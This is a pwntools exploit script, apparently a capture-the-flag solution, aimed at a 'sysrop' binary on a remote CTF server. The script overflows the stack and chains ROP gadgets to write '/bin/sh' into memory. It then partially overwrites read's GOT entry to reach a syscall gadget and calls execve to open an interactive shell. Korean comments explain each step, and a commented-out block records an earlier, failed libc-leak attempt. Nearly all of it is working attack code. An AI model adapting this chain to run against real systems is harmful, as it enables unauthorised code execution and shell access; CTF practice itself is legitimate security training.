from pwn import *

'''
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
'''

context(arch="amd64", os='linux')
e = ELF('./sysrop')

r = remote("ctf.j0n9hyun.xyz", 3024)

dummy = b"A"*(0x10+8)
syscall = 0xf725e
pop_rdi = p64(0x4006c3)
pop_rsi = p64(0x4005ed)
pop_rdx_rdi_rsi = p64(0x4005eb)
pop_rax_rdx_rdi_rsi = p64(0x4005ea)
ret = p64(0x400491)
data = p64(0x601030)
read = p64(e.plt['read'])
read_got = p64(e.got['read'])
main = p64(0x4004f0)

# 먼저 나중에 쓸 exevce 를 위해 /bin/sh문자열 삽입
payload  = dummy
payload += pop_rdx_rdi_rsi
payload += p64(0x10)
payload += p64(0x00)
payload += data
payload += read
payload += main

r.sendline(payload)
sleep(0.1)
r.sendline(b"/bin/sh\x00")

# read함수 근처의 syscall주소로 read got를 조작함
payload  = dummy
payload += pop_rdx_rdi_rsi
payload += p64(0x01)
payload += p64(0x00)
payload += read_got
payload += read

# 이후 조작한 주소값을 이용해 execve syscall을 호출
payload += pop_rax_rdx_rdi_rsi
payload += p64(59)
payload += p64(0x00)
payload += data
payload += p64(0x00)
payload += read
print("length = ", len(payload))


r.send(payload)
sleep(0.1)
r.send(b"\x5e")

r.interactive()

'''
libc 주소를 leak하는데 까지는 했지만 이후 동작이 잘 안되었음.
print("length = ", len(payload))

r.send(payload)
r.sendline(b"\x7a")
r.interactive()
stdout = u64(r.recv(6)+b"\x00\x00")
base = stdout - 0xf725e
system = p64(base + 0x45390)
sh = p64(base + 0x18cd57)
print(hex(stdout))
print("base = ", hex(base))

payload  = dummy
payload += ret*2
payload += pop_rdx_rdi_rsi
payload += p64(0x00)
payload += sh
payload += p64(0x00)
payload += system
'''

